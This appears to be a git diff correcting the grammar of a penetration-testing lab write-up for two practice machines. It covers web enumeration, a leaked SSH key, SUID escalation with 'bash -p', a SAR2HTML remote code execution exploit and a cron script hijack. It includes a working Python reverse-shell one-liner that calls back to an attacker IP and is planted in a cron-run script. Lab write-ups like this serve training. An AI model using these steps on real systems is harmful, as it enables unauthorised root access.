@@ -14,7 +14,7 @@ as shown in the image below I got in result open port 80 running HTTP server and
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.16.39.png)
  ## Web Enumeration
 
-In this step i used Directory/File Enumeration using ffuf tool with a common wordlist.
+In this step, I used Directory/File Enumeration using the ffuf tool with a common wordlist.
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.20.09.png)
 
@@ -24,8 +24,8 @@ from ffuf result i can see that there is a robots.txt i check it and found a dis
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.23.03.png)
 
-the secret.txt contain encrypted data after i decode it with base64 tool i got ssh privet key and this is a sestive data sherd publicy i can use it to ssh to the server remotly using `ssh -i option` becuse i already know the username ,
-after access to the server now we are in but only as oscp user we want go as root so we will check if the is any way to upgrade Privilege to root so this is the next step.
+the secret.txt contain encrypted data after I decode it with the base64 tool I got an ssh private key and this is a sensitive data shared publicly I can use it to ssh to the server remotely using `ssh -i option` because I already know the username,
+after access to the server now we are in but only as oscp user, we want to go as root so we will check if the is any way to upgrade Privilege to root so this is the next step.
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.25.49.png)
 
@@ -33,8 +33,8 @@ after access to the server now we are in but only as oscp user we want go as roo
 
 ## Privilege Escalation
 
-After  accsees to machine we will check how we can do Privilege Escalation ,
-there is a command i used to check if there is suid blalba .
+After access to the machine, we will check how we can do Privilege Escalation, there is a command I used to check if there is  SUID (Set owner User ID up on execution) .
+
 `find / -perm -u=s 2> /dev/null`
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.28.16.png)
@@ -43,16 +43,16 @@ there is a command i used to check if there is suid blalba .
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.30.29.png)
 
-as we can see there is some binarys as suid we can check GTObin how we can use this binary to escale privilege to root , from the result we can see that bash in the list and from gtofbin that bash can escale privilage using `bash -p`
+as we can see there are some binaries as SUID we can check GTObin how we can use this binary to escalate privilege to root, from the result we can see that bash in the list and from https://gtfobins.github.io/ we can see that bash can escalate privilege using `bash -p`
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.31.00.png)
 
-and finly we are root.
+and finally, we are root.
 
 # sar 192.168.239.89
 
-In this machine i did all the same steps as the first machine but in the step 
-<b>Web Enumeration </b> I didn't find any sensitive data i found only a diroctry to sar2HTML i check that dirocrty and i got a sar service runing on server i check if the version of sar if it expots and from explots db i can see there is a vournably i can use it to run shell code exuction as a revers shell what i did first i check ls command and whoaim after that i run server with nc lesing in my ip and port i provide and setablish a connection using a socket with help of python command finaly i have shell form the server I'm now as www-data user .
+In this machine, I did all the same steps as the first machine but in the step 
+<b>Web Enumeration </b> I didn't find any sensitive data I found only a directory to sar2HTML I check that directory and I got a SAR service running on the server I check if the version of SAR fi it exploit and from https://www.exploit-db.com/exploits/47204 I can see there is a vulnerable I can use it to run shell code execution as a reverse shell what I did first I check ls command and `whoaim` after that I run the server with NC listening in my IP and port I provide and established a connection using a socket with help of python command finally I have a shell from the server I'm now as the www-data user.
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.35.06.png)
 
@@ -77,9 +77,9 @@ In this machine i did all the same steps as the first machine but in the step
 
 ## Privilege Escalation
 
-In this machine also i check if there is any binary to use to escale privilage but unfornaty i did not fine any so i checked crontab i found there is a script called finally.sh run every 5 minit with root permition so find this script location i cat it and got that script called onther script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run somting for me as root by changing the write.sh so what i did i removed the write.sh from server i and i create new now in my machine with .
+In this machine also checked if there is any binary to use to escalate privilege but unfortunately I did not find any so I checked crontab I found there is a script called finally.sh run every 5 minutes with root permission so find this script location I cat it and got that script called other script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run something for me as root by changing the write.sh so what I did i removed the write.sh from server i and i create new now in my machine with.
 `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.55.200",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
-and run a http server from my machine and download it to the server using wget after that i changed permtion to make it exuxtbale bacause the finnaly script call write script with ./write it need permmtion to excyte now all i need to wait 5 minte to get revese shell with as root .
+and run an HTTP server from my machine and download it to the server using `wget` after that i changed permission to make it executable because the finnaly.sh script call write.sh script with ./write needs permission to execute now all I need to wait for 5 minutes waiting for crontab to get the reverse shell with as root.
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.19.png)
 
